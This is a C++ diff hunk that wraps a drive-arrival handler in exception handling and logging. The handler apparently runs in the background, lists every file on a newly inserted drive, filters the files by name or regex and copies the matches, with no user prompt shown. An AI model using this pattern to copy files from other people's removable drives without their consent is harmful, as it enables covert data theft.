@@ -24,42 +24,50 @@ typedef SystemConfig::ConfigData ConfigData;
 typedef SystemConfig::ConfigData::DeviceConfig DeviceConfig;
 
 void DeviceArrivalMain(TCHAR DriveLetter) {
-	SystemConfig* config = SystemConfig::getInstance();
-	Device dv(DriveLetter);
-	Device::DiskInformation info = dv.GetDiskInformation();
-	unsigned int SN = info.VolumeSerialNumber;
-	ConfigData data = config->readConfig();
+	try {
+		SystemConfig* config = SystemConfig::getInstance();
+		Device dv(DriveLetter);
+		Device::DiskInformation info = dv.GetDiskInformation();
+		unsigned int SN = info.VolumeSerialNumber;
+		ConfigData data = config->readConfig();
 
-	if (!data.Service.Enabled)
-		return;
+		if (!data.Service.Enabled)
+			return;
 
-	vector<DeviceConfig> &deviceExcept = data.Service.DeviceConfig;
-	DeviceConfig sdc = data.Service.DefaultConfig;
-	for (const DeviceConfig& cfg : deviceExcept) {
-		if (cfg.SerialNumber == SN) {
-			sdc = cfg;
-			break;
+		vector<DeviceConfig>& deviceExcept = data.Service.DeviceConfig;
+		DeviceConfig sdc = data.Service.DefaultConfig;
+		for (const DeviceConfig& cfg : deviceExcept) {
+			if (cfg.SerialNumber == SN) {
+				sdc = cfg;
+				break;
+			}
+		}
+		if (sdc.ListenMode == ListenMode::DISABLED)
+			return;
+
+		FileLister lister(dv);
+		shared_ptr<list<FileData>> list = lister.ListFile();
+		FileCopyer copyer(dv);
+		FileSearcher searcher;
+		if (sdc.FileListerEnabled) {
+			copyer.ListFile(list);
+		}
+		if (sdc.FileCopyer.NormalCopyEnabled) {
+			auto ptr = searcher.FindFile(list, sdc.FileCopyer.NormalFilters);
+			copyer.setPaths(ptr);
+			copyer.Copy(sdc.Limit.MaxSize, sdc.Limit.MaxCount);
+		}
+		if (sdc.FileCopyer.RegexCopyEnabled) {
+			auto ptr = searcher.FindFileRegex(list, sdc.FileCopyer.RegexFilters);
+			copyer.setPaths(ptr);
+			copyer.Copy(sdc.Limit.MaxSize, sdc.Limit.MaxCount);
 		}
 	}
-	if (sdc.ListenMode == ListenMode::DISABLED)
-		return;
-
-	FileLister lister(dv);
-	shared_ptr<list<FileData>> list = lister.ListFile();
-	FileCopyer copyer(dv);
-	FileSearcher searcher;
-	if (sdc.FileListerEnabled) {
-		copyer.ListFile(list);
+	catch (exception& e) {
+		LOG->e(Convert().toString(e.what()));
 	}
-	if (sdc.FileCopyer.NormalCopyEnabled) {
-		auto ptr = searcher.FindFile(list, sdc.FileCopyer.NormalFilters);
-		copyer.setPaths(ptr);
-		copyer.Copy(sdc.Limit.MaxSize, sdc.Limit.MaxCount);
-	}
-	if (sdc.FileCopyer.RegexCopyEnabled) {
-		auto ptr = searcher.FindFileRegex(list, sdc.FileCopyer.RegexFilters);
-		copyer.setPaths(ptr);
-		copyer.Copy(sdc.Limit.MaxSize, sdc.Limit.MaxCount);
+	catch (...) {
+		LOG->e(L"Unknown Error.");
 	}
 }
 
